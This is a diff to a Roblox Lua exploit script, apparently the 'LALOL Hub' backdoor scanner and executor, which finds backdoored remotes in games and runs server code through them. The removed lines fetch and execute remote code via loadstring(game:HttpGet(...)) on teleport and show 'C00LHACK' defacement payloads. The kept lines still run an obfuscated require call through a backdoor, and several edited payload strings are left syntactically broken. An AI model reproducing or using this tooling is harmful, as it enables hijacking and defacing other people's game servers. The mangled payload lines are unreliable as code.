@@ -115,7 +115,7 @@ G2L["11"]["TextColor3"] = Color3.fromRGB(198, 119, 88);
 G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
 G2L["11"]["MultiLine"] = true;
 G2L["11"]["BackgroundTransparency"] = 1;
-G2L["11"]["PlaceholderText"] = [[require(6666666).load("c00lkidd")]];
+G2L["11"]["PlaceholderText"] = [[Put your require or script here!]];
 G2L["11"]["Size"] = UDim2.new(0, 448, 0, 150);
 G2L["11"]["Text"] = [[]];
 G2L["11"]["Position"] = UDim2.new(0.015692640095949173, 0, 0.042270027101039886, 0);
@@ -1408,7 +1408,7 @@ local function C_20()
 local script = G2L["20"];
 	queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 	if queueteleport then
-		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()")
+		queueteleport("")
 	end
 	
 	GUI=script.Parent.Frame
@@ -1559,9 +1559,9 @@ local script = G2L["20"];
 					GUI.Scanner.Visible=false
 					makeVisible(GUI.Executor, true)
 	
-	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='C00LHACK HAXED THIS GAME!'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
+	--				runRemote(backdoor, "a=Instance.new for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
 					runRemote(remote, "require(171016405.1884*69)")			
-					runRemote(remote, "a=Instance.new('Hint')a.Text='C00LHACK HAXED THIS GAME!'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+					runRemote(remote, "''while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 					
 					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
@@ -1598,7 +1598,7 @@ local script = G2L["20"];
 		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
 			debug('Protected backdoor found', 3)
 			spawn(function()
-				local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', a) end)
+				local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('', a) end)
 				if variantValue~=nil then
 					local splited=string.split(variantValue,':')
 					notify(splited[#splited])
